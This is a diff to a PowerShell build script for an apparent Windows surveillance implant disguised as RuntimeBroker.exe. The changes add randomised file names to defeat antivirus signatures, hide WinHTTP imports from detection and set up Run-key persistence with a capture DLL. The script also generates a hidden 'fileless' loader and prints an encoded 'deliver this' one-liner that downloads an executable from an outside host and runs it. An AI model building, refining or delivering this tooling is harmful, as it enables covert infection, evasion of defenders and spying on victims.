@@ -3,7 +3,7 @@ $env:Path = "C:\msys64\ucrt64\bin;" + $env:Path
 powershell -ExecutionPolicy Bypass -File encrypt_config.ps1
 if (!$?) { Write-Output "Config encryption failed"; exit 1 }
 
-# Generate random identifiers for this build (anti-signature + unique install path)
+# Generate random identifiers for this build (anti-signature + unique install path + delivery)
 $randSuffix = (Get-Random -Minimum 100000 -Maximum 999999).ToString()
 $mtxVal = "WUClient_$randSuffix"
 $clsVal = "WUFilter_$randSuffix"
@@ -13,6 +13,11 @@ $exePrefixes = @("chost", "svcinit", "cachemgr", "hostsvc", "appcache", "pkghost
 $dirVal = ($dirPrefixes | Get-Random) + "_" + $randSuffix
 $exeVal = ($exePrefixes | Get-Random) + $randSuffix + ".exe"
 $runVal = "Windows" + ($exePrefixes | Get-Random) + $randSuffix
+$logVal = @("wuaueng", "diaghost", "svcstat", "cachelog", "hostdiag")[(Get-Random -Maximum 5)] + $randSuffix + ".log"
+# First-drop name/path (one-liner) — never always a.exe in TEMP
+$dropNames = @("setup$randSuffix.exe", "update$randSuffix.exe", "host$randSuffix.exe", "cache$randSuffix.exe", "svc$randSuffix.exe")
+$dropName = $dropNames | Get-Random
+$dropLoc = Get-Random -Maximum 3  # 0=TEMP, 1=LOCALAPPDATA, 2=PUBLIC
 $uaList = @(
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
@@ -29,6 +34,7 @@ $append = @"
 #define AGENT_INSTALL_DIR "$dirVal"
 #define AGENT_INSTALL_EXE "$exeVal"
 #define AGENT_RUN_VALUE "$runVal"
+#define AGENT_LOG_NAME "$logVal"
 "@
 $old = Get-Content config.h -Raw
 $new = $old.TrimEnd(" `t`r`n")
@@ -50,7 +56,8 @@ if (!$?) { Write-Output "DLL compilation failed"; exit 1 }
 windres capture_dll.rc -O coff -o capture_dll.res
 if (!$?) { Write-Output "DLL resource compilation failed"; exit 1 }
 
-g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -o RuntimeBroker.exe
+# No -lwinhttp: WinHTTP resolved at runtime (InitDynamicApis) to drop IAT family signal
+g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res capture_dll.res -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -o RuntimeBroker.exe
 if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
 
 # Remove the random stub we appended (instead of git checkout which reverts all changes)
@@ -65,17 +72,22 @@ Remove-Item -Force capture_dll.res -ErrorAction SilentlyContinue
 Remove-Item -Force capture_dll.dll -ErrorAction SilentlyContinue
 # upx --ultra-brute RuntimeBroker.exe
 
-# Generate loader.ps1 (fileless delivery)
+# Generate loader.ps1 (fileless delivery) — randomized drop path/name
 $exeBytes = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
 $b64 = [Convert]::ToBase64String($exeBytes)
+$loaderDrop = switch ($dropLoc) {
+    0 { "`$env:TEMP+'\$dropName'" }
+    1 { "`$env:LOCALAPPDATA+'\$dropName'" }
+    default { "`$env:PUBLIC+'\$dropName'" }
+}
 $loader = @"
 `$d = "$b64"
 `$b = [Convert]::FromBase64String(`$d)
-`$p = "`$env:TEMP\RuntimeBroker.exe"
+`$p = $loaderDrop
 [IO.File]::WriteAllBytes(`$p, `$b)
 Start-Process -WindowStyle Hidden `$p
 Start-Sleep -Milliseconds 500
-Remove-Item `$p -Force
+Remove-Item `$p -Force -ErrorAction SilentlyContinue
 "@
 Set-Content -Path "loader.ps1" -Value $loader
 
@@ -126,10 +138,17 @@ try {
     } else { Write-Output "WARNING: GITHUB_TOKEN not set, skipping GitHub upload" }
     Write-Output ""
     Write-Output "=== ONE-LINER (deliver this) ==="
-    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p"
+    # Per-build random drop path + name (breaks Temp\a.exe family habit)
+    $dropExpr = switch ($dropLoc) {
+        0 { "`$env:TEMP+'\$dropName'" }
+        1 { "`$env:LOCALAPPDATA+'\$dropName'" }
+        default { "`$env:PUBLIC+'\$dropName'" }
+    }
+    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=$dropExpr;[IO.File]::WriteAllBytes(`$p,`$b);start `$p"
     $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
     $encCmd = [Convert]::ToBase64String($encBytes)
     Write-Output "powershell -w h -Enc $encCmd"
+    Write-Output "drop: $dropExpr"
     Write-Output "=================================="
 } catch {
     Write-Output ""
